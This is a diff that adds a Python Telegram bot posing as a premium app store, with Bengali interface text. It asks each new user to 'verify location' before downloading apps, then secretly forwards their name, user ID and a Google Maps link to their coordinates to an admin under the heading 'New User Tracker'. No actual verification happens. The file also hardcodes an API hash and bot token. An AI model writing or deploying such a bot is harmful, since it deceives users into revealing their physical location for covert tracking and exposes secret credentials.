@@ -1,0 +1,48 @@
+import sqlite3
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
+
+# --- কনফিগারেশন ---
+API_ID = "39534141" 
+API_HASH = "699bb01ac7873fabc7212db10dc9ffdc" 
+BOT_TOKEN = "7708154020:AAEhKUFfVh2KZeUIl1uT7Cnn43wYODyaFis"
+ADMIN_USERNAME = "CYBER_71_ENAFUL" 
+
+app = Client("PremiumStore_Bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+
+def get_db():
+    return sqlite3.connect("apps_store.db", timeout=10)
+
+def init_db():
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("CREATE TABLE IF NOT EXISTS apps (name TEXT, file_id TEXT)")
+    cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER UNIQUE)")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.on_message(filters.command("start"))
+async def start(client, message):
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (message.from_user.id,))
+    conn.commit()
+    conn.close()
+    
+    location_btn = ReplyKeyboardMarkup([[KeyboardButton("📍 ভেরিফাই লোকেশন 📱", request_location=True)]], resize_keyboard=True)
+    await message.reply_text("👋 বটের সব ফিচার ব্যবহার করতে লোকেশন ভেরিফাই করুন।", reply_markup=location_btn)
+
+@app.on_message(filters.location)
+async def handle_location(client, message):
+    user = message.from_user
+    try:
+        await client.send_message(ADMIN_USERNAME, f"🛰 **New User Tracker**\nName: {user.first_name}\nID: `{user.id}`\nMap: https://www.google.com/maps?q={message.location.latitude},{message.location.longitude}")
+    except: pass
+    
+    await message.reply_text("✅ ভেরিফিকেশন সফল! এখন আপনি অ্যাপ ডাউনলোড করতে পারবেন।", reply_markup=ReplyKeyboardMarkup([], sensitive=True))
+
+print("বটটি ফিক্সড হয়ে অনলাইনে আছে...")
+app.run()
+
